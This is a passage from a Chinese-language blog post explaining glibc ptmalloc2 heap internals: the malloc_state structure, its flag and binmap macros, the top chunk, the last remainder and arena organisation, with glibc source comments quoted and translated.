chunk 为 128B</strong>。ptmalloc 默认情况下<strong>调用 set_max_fast(s)将全局变量 global_max_fast 设置为 DEFAULT_MXFAST</strong>，也就 是设置 fast bins 中 chunk 的最大值，<strong>get_max_fast()用于获得这个全局变量 global_max_fast 的值</strong>。</p><h5 id="5-3-核心结构体分析"><a href="#5-3-核心结构体分析" class="headerlink" title="5.3 核心结构体分析"></a>5.3 核心结构体分析</h5><p>每个分配区是 struct malloc_state 的一个实例，ptmalloc 使用 <strong>malloc_state 来管理分配区</strong>， 而<strong>参数管理使用 struct malloc_par，全局拥有一个唯一的 malloc_par 实例。</strong></p><h5 id="5-3-1-malloc-state"><a href="#5-3-1-malloc-state" class="headerlink" title="5.3.1 malloc_state"></a>5.3.1 malloc_state</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="comment">/* 序列化访问 */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="comment">/* 标志位（以前在 max_fast 中） */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="comment">/* 如果 fastbin 块包含最近插入的空闲块，则设置为 1 */</span></span><br><span class="line">  <span class="comment">/* 注意，这是一个布尔值，但并非所有目标平台都支持对布尔值的原子操作 */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  <span class="comment">/* 最顶层块的基址 -- 不在任何 bin 中 */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  <span class="comment">/* 最近一次拆分小型请求产生的剩余块 */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">/* 正常 bins，按照上述描述进行打包 */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="comment">/* bins 的位图 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="comment">/* 链表 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="comment">/* 用于空闲 arenas 的链表。访问该字段由 arena.c 中的 free_list_lock 进行序列化 */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">   <span class="comment">/* 附加到该 arena 的线程数。如果该 arena 在空闲列表中，则为 0。访问该字段由 arena.c 中的              free_list_lock 进行序列化 */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  <span class="comment">/* 在该 arena 中从系统分配的内存 */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>​<strong>Mutex 用于串行化访问分配区</strong>，当有多个线程访问同一个分配区时，<strong>第一个获得这个 mutex 的线程将使用该分配区分配内存</strong>，<strong>分配完成后，释放该分配区的 mutex</strong>，以便其它线程使用该分配区。</p><p>​<strong>Flags 记录了分配区的一些标志</strong>，<strong>bit0</strong> 用于标识分配区<strong>是否包含至少一个 fast bin chunk</strong>， <strong>bit1</strong> 用于标识分配区<strong>是否能返回连续的虚拟地址空间</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> FASTCHUNKS_BIT held in max_fast indicates that there are probably</span></span><br><span class="line"><span class="comment"> some fastbin chunks. It is set true on entering a chunk into any</span></span><br><span class="line"><span class="comment"> fastbin, and cleared only in malloc_consolidate.</span></span><br><span class="line"><span class="comment"> The truth value is inverted so that have_fastchunks will be true</span></span><br><span class="line"><span class="comment"> upon startup (since statics are zero-filled), simplifying</span></span><br><span class="line"><span class="comment"> initialization checks.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">在 max_fast 中持有的 FASTCHUNKS_BIT 表示可能存在一些 fastbin 块。</span></span><br><span class="line"><span class="comment">当将块插入任何 fastbin 中时，将其设置为 true，并且仅在 malloc_consolidate 中清除。</span></span><br><span class="line"><span class="comment">为了使 have_fastchunks 在启动时为 true（因为静态变量会被零填充），真值被取反，简化了初始化检查。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>该注释解释了在 <code>max_fast</code> 中持有的 <strong><code>FASTCHUNKS_BIT</code></strong> 表示可能存在一些 <code>fastbin</code> 块的含义。<strong>当将块插入任何 <code>fastbin</code>中时，会将该标志位设置为 <code>true</code><strong>，并且</strong>只有在 <code>malloc_consolidate</code> 函数中才会清除该标志位</strong>。为了确保在启动时 <code>have_fastchunks</code> 为 <code>true</code>（<strong>因为静态变量会被零填充</strong>），<strong>真值被取反，简化了初始化检查</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FASTCHUNKS_BIT (1U)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> have_fastchunks(M) (((M)-&gt;flags &amp; FASTCHUNKS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) catomic_or (&amp;(M)-&gt;flags, FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) catomic_and (&amp;(M)-&gt;flags, ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_fastchunks(M) ((M)-&gt;flags |= FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_fastchunks(M) ((M)-&gt;flags &amp;= ~FASTCHUNKS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>​上面的宏<strong>用于设置或是置位 flags 中 fast chunk 的标志位 bit0</strong>，如果 <strong>bit0 为 0</strong>，表示<strong>分配区中有 fast chunk</strong>，<strong>如果为 1 表示没有 fast chunk</strong>，<strong>初始化完成后的 malloc_state 实例中，flags 值为 0</strong>，表示该分配区中有 fast chunk，但<strong>实际上没有</strong>，试图<strong>从 fast bins 中分配 chunk 都会返回 NULL</strong>，在<strong>第一次调用函数 malloc_consolidate()对 fast bins 进行 chunk 合并时</strong>，如果 <strong>max_fast 大于 0</strong>，会<strong>调用 clear_fastchunks 宏</strong>，<strong>标志该分配区中已经没有 fast chunk</strong>，因为函数 malloc_consolidate()会合并所有的 fast bins 中的 chunk。<strong>clear_fastchunks 宏只会在函数 malloc_consolidate()中调用</strong>。<strong>当有 fast chunk 加入 fast bins 时，就是调用 set_fastchunks 宏标 46 识分配区的 fast bins 中存在 fast chunk。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous</span></span><br><span class="line"><span class="comment"> regions. Otherwise, contiguity is exploited in merging together,</span></span><br><span class="line"><span class="comment"> when possible, results from consecutive MORECORE calls.</span></span><br><span class="line"><span class="comment"> The initial value comes from MORECORE_CONTIGUOUS, but is</span></span><br><span class="line"><span class="comment"> changed dynamically if mmap is ever used as an sbrk substitute.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">NONCONTIGUOUS_BIT 表示 MORECORE 不返回连续的内存区域。</span></span><br><span class="line"><span class="comment">否则，在可能的情况下，连续的 MORECORE 调用结果会被合并在一起。</span></span><br><span class="line"><span class="comment">初始值来自 MORECORE_CONTIGUOUS，但如果 mmap 被用作 sbrk 的替代，则会动态更改。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>该注释解释了 <code>NONCONTIGUOUS_BIT</code> 的含义。**<code>NONCONTIGUOUS_BIT</code> 表示 <code>MORECORE</code> 函数不返回连续的内存区域。<strong>在正常情况下，</strong>如果连续的 <code>MORECORE</code> 调用返回的内存区域是相邻的<strong>，那么在</strong>合并内存块时可以利用这种连续性。**</p><p>初始情况下，**<code>NONCONTIGUOUS_BIT</code> 的值来自 <code>MORECORE_CONTIGUOUS</code><strong>，但</strong>如果在后续的内存分配中使用了 <code>mmap</code> 作为 <code>sbrk</code> 的替代方式，那么 <code>NONCONTIGUOUS_BIT</code> 的值会动态地进行更改。**</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NONCONTIGUOUS_BIT (2U)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> contiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> noncontiguous(M) (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_noncontiguous(M) ((M)-&gt;flags |= NONCONTIGUOUS_BIT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_contiguous(M) ((M)-&gt;flags &amp;= ~NONCONTIGUOUS_BIT)</span></span><br></pre></td></tr></table></figure><p>​Flags 的 <strong>bit1 如果为 0</strong>，表示 <strong>MORCORE 返回连续虚拟地址空间</strong>，<strong>bit1 为 1</strong>，表示 <strong>MORCORE 返回非连续虚拟地址空间</strong>，对于<strong>主分配区，MORECORE 其实为 sbr()，默认返回连续虚拟地 址空间</strong>，对于<strong>非主分配区，使用 mmap()分配大块虚拟内存，然后进行切分来模拟主分配区的行为</strong>，而默认情况下 mmap 映射区域是不保证虚拟地址空间连续的，所以<strong>非主分配区默认分配非连续虚拟地址空间。</strong></p><p>​Malloc_state 中声明了几个对锁的统计变量，<strong>默认没有定义 THREAD_STATS</strong>，所以<strong>不会对锁的争用情况做统计</strong>。 </p><p>​<strong>fastbinsY 拥有 10（NFASTBINS）个元素的数组</strong>，<strong>用于存放每个 fast chunk 链表头指针</strong>， <strong>所以 fast bins 最多包含 10 个 fast chunk 的单向链表。</strong> </p><p>​<strong>top 是一个 chunk 指针</strong>，<strong>指向分配区的 top chunk</strong>。 </p><p>​<strong>last_remainder 是一个 chunk 指针</strong>，分配区上次分配 small chunk 时，从一个 chunk 中分裂出一个 small chunk 返回给用户，<strong>分裂后的剩余部分形成一个 chunk，last_remainder 就是指向的这个 chunk。</strong></p><p>​<strong>bins 用于存储 unstored bin，small bins 和 large bins 的 chunk 链表头</strong>，small bins 一共 62 个，large bins 一共 63 个，加起来一共 125 个 bin。而 NBINS 定义为 128，其实 bin[0]和 bin[127] 都不存在，bin[1]为 unsorted bin 的 chunk 链表头，所以实际只有 126bins。<strong>Bins 数组能存放 了 254（NBINS * 2 – 2）个 mchunkptr 指针</strong>，而我们实现需要存储 chunk 的实例，一般情况下， <strong>chunk 实例的大小为 6 个 mchunkptr 大小</strong>，这 254 个指针的大小怎么能存下 126 个 chunk 呢？ 这里使用了一个技巧，如果按照我们的常规想法，也许会申请 126 个 malloc_chunk 结构体指针元素的数组，然后再给链表申请一个头节点（即 126 个），再让每个指针元素正确指向而形成 126 个具有头节点的链表。事实上，对于 malloc_chunk 类型的链表“头节点”，其内的 <strong>prev_size 和 size 字段是没有任何实际作用的，fd_nextsize 和 bk_nextsize 字段只有 large bins 中的空闲 chunk 才会用到，而对于 large bins 的空闲 chunk 链表头不需要这两个字段，因此 这四个字段所占空间如果不合理使用的话那就是白白的浪费。</strong>我们再来看一看 128 个 malloc_chunk 结构体指针元素的数组占了多少内存空间呢？<strong>假设 SIZE_SZ 的大小为 8B，则指针的大小也为 8B</strong>，结果为 126 * 2 * 8&#x3D;2016 字节。而 126 个 malloc_chunk 类型的链表“头节点” 需要多少内存呢？126 * 6 * 8&#x3D;6048，真的是 6048B 么？不是，刚才不是说了，prev_size，size， fd_nextsize 和 bk_nextsize 这四个字段是没有任何实际作用的，因此完全可以被重用（覆盖）， 47 因此实际需要内存为 126<em>2</em>8&#x3D;2016。<em><em>Bins 指针数组的大小为，（128 * 2 - 2）</em> 8&#x3D;2032</em>* , 2032 大 于 2016（<strong>事实上最后 16 个字节都被浪费掉了</strong>），那么这 <strong>254 个 malloc_chunk结构体指针元素数组所占内存空间就可以存储这 126 个头节点了。</strong></p><p>​<strong>binmap 字段是一个 int 数组，ptmalloc 用一个 bit 来标识该 bit 对应的 bin 中是否包含空 闲 chunk。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Binmap</span></span><br><span class="line"><span class="comment"> To help compensate for the large number of bins, a one-level index</span></span><br><span class="line"><span class="comment"> structure is used for bin-by-bin searching. `binmap&#x27; is a</span></span><br><span class="line"><span class="comment"> bitvector recording whether bins are definitely empty so they can</span></span><br><span class="line"><span class="comment"> be skipped over during during traversals. The bits are NOT always</span></span><br><span class="line"><span class="comment"> cleared as soon as bins are empty, but instead only</span></span><br><span class="line"><span class="comment"> when they are noticed to be empty during traversal in malloc.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">位图（Binmap）</span></span><br><span class="line"><span class="comment">为了弥补大量的 bin（内存块链表），使用了一级索引结构来进行逐个 bin 的搜索。</span></span><br><span class="line"><span class="comment">binmap 是一个位向量，记录了哪些 bin 明确为空，以便在遍历过程中可以跳过这些空的 bin。</span></span><br><span class="line"><span class="comment">这些位在 bin 变为空时并不总是立即清除，而是在 malloc 的遍历过程中注意到它们为空时才进行清除。</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BITSPERMAP (1U &lt;&lt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BINMAPSIZE (NBINS / BITSPERMAP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2block(i) ((i) &gt;&gt; BINMAPSHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT)-1))))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m,i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unmark_bin(m,i) ((m)-&gt;binmap[idx2block(i)] &amp;= ~(idx2bit(i)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_binmap(m,i) ((m)-&gt;binmap[idx2block(i)] &amp; idx2bit(i))</span></span><br></pre></td></tr></table></figure><p>​<strong>binmap 一共 128bit，16 字节，4 个 int 大小</strong>，binmap 按 int 分成 4 个 block，每个 block 有 32 个 bit，根据 bin indx 可以使用宏 idx2block 计算出该 bin 在 binmap 对应的 bit 属于哪个 block。idx2bit 宏取第 i 位为 1，其它位都为 0 的掩码，举个例子：idx2bit(3) 为 “0000 1000” （只显示 8 位）。<strong>mark_bin 设置第 i 个 bin 在 binmap 中对应的 bit 位为 1；unmark_bin 设置 第 i 个 bin 在 binmap 中对应的 bit 位为 0；get_binmap 获取第 i 个 bin 在 binmap 中对应的 bit。</strong> </p><p>​<strong>next 字段用于将分配区以单向链表链接起来。</strong> </p><p>​<strong>next_free 字段空闲的分配区链接在单向链表中，只有在定义了 PER_THREAD 的情况下才 定义该字段。</strong> </p><p>​<strong>system_mem 字段记录了当前分配区已经分配的内存大小。</strong> </p><p>​<strong>max_system_mem 记录了当前分配区最大能分配的内存大小。</strong></p><h4 id="堆相关数据结构-大部分与上述重复"><a href="#堆相关数据结构-大部分与上述重复" class="headerlink" title="堆相关数据结构(大部分与上述重复)"></a>堆相关数据结构(大部分与上述重复)</h4><p><strong>！！！一些关于堆的约束，后面详细考虑！！！</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    The three exceptions to all this are:</span></span><br><span class="line"><span class="comment">     1. The special chunk `top&#x27; doesn&#x27;t bother using the</span></span><br><span class="line"><span class="comment">    trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">    that would have to index off it. After initialization, `top&#x27;</span></span><br><span class="line"><span class="comment">    is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">    MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">    bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">    allocated one-by-one, each must contain its own trailing size</span></span><br><span class="line"><span class="comment">    field.  If the M bit is set, the other bits are ignored</span></span><br><span class="line"><span class="comment">    (because mmapped chunks are neither in an arena, nor adjacent</span></span><br><span class="line"><span class="comment">    to a freed chunk).  The M bit is also used for chunks which</span></span><br><span class="line"><span class="comment">    originally came from a dumped heap via malloc_set_state in</span></span><br><span class="line"><span class="comment">    hooks.c.</span></span><br><span class="line"><span class="comment">     3. Chunks in fastbins are treated as allocated chunks from the</span></span><br><span class="line"><span class="comment">    point of view of the chunk allocator.  They are consolidated</span></span><br><span class="line"><span class="comment">    with their neighbors only in bulk, in malloc_consolidate.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在所有这些规则之外，有三个例外情况：</span></span><br><span class="line"><span class="comment">     1. 特殊块 top 不使用尾部的大小字段，因为没有下一个连续的块需要引用它。在初始化之后，top 始终存在。如果它的长度变得小于 MINSIZE 字节，它会被重新填充。</span></span><br><span class="line"><span class="comment">     2. 通过 mmap 分配的块，在其大小字段中设置了第二低位 M（IS_MMAPPED）。因为它们是逐个分配的，每个块必须包含自己的尾部大小字段。如果设置了 M 位，其他位将被忽略（因为 mmapped 块既不在一个 arena 中，也不与已释放的块相邻）。M 位还用于最初通过 hooks.c 中的 malloc_set_state 从已转储堆中获取的块。</span></span><br><span class="line"><span class="comment">     3. 快速分配链表（fastbins）中的块在块分配器的视角中被视为已分配的块。它们仅在 malloc_consolidate 中批量与相邻块合并。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h5 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h5><p>glibc 中对于 top chunk 的描述如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用<strong>在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk</strong>。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p><p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><p><strong>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</strong></p><h5 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h5><p>在用户使用 malloc 请求分配内存时，<strong>ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致</strong>，这时候<strong>就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块</strong>。<strong>top chunk 分割剩下的部分不会作为 last remainder.</strong></p><h4 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h4><h5 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h5><p>在我们之前介绍的例子中，无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的 arena。那么会不会每个线程都有独立的 arena 呢？下面我们就具体介绍。</p><h5 id="arena-数量"><a href="#arena-数量" class="headerlink" title="arena 数量"></a>arena 数量</h5><p>对于不同系统，arena 数量的<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847">约束</a>如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure><p>显然，不是每一个线程都会有对应的 arena。至于为什么 64 位系统，要那么设置，我也没有想明白。此外，因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个 arena。</p><h5 id="arena-分配规则-来自于不知名博客，不确定其完全正确性"><a href="#arena-分配规则-来自于不知名博客，不确定其完全正确性" class="headerlink" title="arena 分配规则(来自于不知名博客，不确定其完全正确性)"></a>arena 分配规则(来自于不知名博客，不确定其完全正确性)</h5><p>Ptmalloc2通过几种数据结构来进行管理，主要有arena,heap,chunk三种层级。<strong>arena和heap都是对chunk的一种组织方式，方便之后的分配，arena又是对heap的组织，arene是堆管理器。</strong></p><ul><li><p><code>arena</code>: 有一个main_arena，是由主线程创建的，thread_arena则为各线程创建的，当arena满了之后就不再创建而是与其他arena共享一个arena，方法为依次给各个arena上锁（查看是否有其他线程正在使用该arena），如果上锁成功（没有其他线程正在使用），则使用该arena，之后一直使用这个arena，如果无法使用则阻塞等待。</p></li><li><p><code>heap</code>的等级就比arena要低一些了，一个arena可以有多个heap，也是存储了堆相关的信息。</p></li><li><p><code>chunk</code>为分配给用户的内存的一个单位，每当我们分配一段内存的时候其实就是分配得到了一个chunk，我们就可以在chunk当中进行一定的操作了。不过为了进行动态分配，chunk本身也有一些数据（元数据），是用来指示其分配等等的数据。</p></li><li><p>glibc的malloc源码中涉及三种最重要数据结构：<strong>Arena、Heap、Chunk</strong> ，分别对应结构体<strong>malloc_state、heap_info、malloc_chunk 。</strong>每个数据结构都有对应的结构体实现,如图:</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212590.png" alt="image-20231220232830154"></p><ul><li><strong>Thread - Arena</strong> ： <strong>一个Arena对应多个线程Thread</strong>。即<strong>每个线程都有一个Arena</strong>，但是**有可能多个线程共用一个Arena(同一时间只能一对一)**。每个Arena都包含一个malloc_state结构体，保存bins, top chunk, Last reminder chunk等信息。</li><li><strong>Arena - Heap</strong>：一个Arena可能拥有多个heap。Arena开始的时候只有一个heap，<strong>但是当这个heap的空间用尽时，就需要获取新的heap</strong>。(也可以理解为subheap子堆)</li><li><strong>Heap - Chunk</strong>：一个Heap根据用户的请求会划分为多个chunk，<strong>每个chunk拥有自己的header - malloc_chunk。</strong></li></ul></li></ul><h5 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h5><p>与 thread 不同的是，main_arena 并不在申请的 heap 中，而是一个全局变量，在 libc.so 